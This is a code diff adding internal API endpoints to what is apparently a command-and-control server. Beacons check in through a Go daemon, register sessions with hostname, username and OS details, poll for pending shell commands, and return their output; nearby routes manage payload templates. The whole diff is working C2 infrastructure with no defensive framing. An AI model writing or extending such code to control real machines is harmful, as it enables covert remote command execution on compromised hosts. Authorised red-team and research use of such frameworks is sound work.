@@ -124,3 +124,75 @@ async def update_payload_template(tid: str, req: Request):
 async def delete_payload_template(tid: str):
     db.delete_payload_template(tid)
     return {"ok": True}
+
+
+# ── 内部 bridge 接口（c2d Go 守护进程回调；受全局 Bearer Token 中间件保护）──
+
+@router.post("/internal/sessions/checkin")
+async def internal_session_checkin(req: Request):
+    """注册或复用会话。reuse=true 时同 listener+IP 的活跃会话复用（HTTP beacon），否则新建"""
+    body = await req.json()
+    listener_id = body.get("listener_id", "")
+    remote = body.get("remote_addr", "")
+    reuse = body.get("reuse", False)
+    hostname = body.get("hostname", "")
+    username = body.get("username", "")
+    os_info = body.get("os_info", "")
+
+    if reuse:
+        existing = [s for s in db.list_sessions()
+                    if s["remote_addr"] == remote and s["listener_id"] == listener_id
+                    and s["status"] == "active"]
+        if existing:
+            sid = existing[0]["id"]
+            db.update_session(sid, hostname=hostname, username=username, os_info=os_info)
+            return {"session_id": sid}
+
+    session = db.create_session(listener_id=listener_id, remote_addr=remote,
+                                hostname=hostname, username=username, os_info=os_info)
+    return {"session_id": session["id"]}
+
+
+@router.post("/internal/sessions/{sid}/meta")
+async def internal_session_meta(sid: str, req: Request):
+    body = await req.json()
+    db.update_session(sid,
+                      hostname=body.get("hostname", ""),
+                      username=body.get("username", ""),
+                      os_info=body.get("os_info", ""))
+    return {"ok": True}
+
+
+@router.post("/internal/sessions/{sid}/poll")
+async def internal_session_poll(sid: str):
+    """弹出一条待执行任务（标记 sent），并刷新会话活跃状态"""
+    tasks = db.list_c2_tasks(sid)
+    for t in tasks:
+        if t["status"] == "pending":
+            db.update_c2_task(t["id"], status="sent")
+            db.update_session(sid, status="active")
+            return {"task_id": t["id"], "command": t["command"]}
+    db.update_session(sid, status="active")
+    return {"task_id": "", "command": ""}
+
+
+@router.post("/internal/sessions/{sid}/result")
+async def internal_session_result(sid: str, req: Request):
+    """回写任务结果；task_id 为空时写入该会话最近一条 sent 任务（HTTP beacon 无 id 的场景）"""
+    body = await req.json()
+    task_id = body.get("task_id", "")
+    output = (body.get("output", "") or "")[:5000]
+    if task_id:
+        db.update_c2_task(task_id, result=output)
+        return {"ok": True, "matched": "id"}
+    for t in db.list_c2_tasks(sid):
+        if t["status"] == "sent":
+            db.update_c2_task(t["id"], result=output)
+            return {"ok": True, "matched": "latest_sent"}
+    return {"ok": False, "matched": "none"}
+
+
+@router.post("/internal/sessions/{sid}/dead")
+async def internal_session_dead(sid: str):
+    db.update_session(sid, status="dead")
+    return {"ok": True}
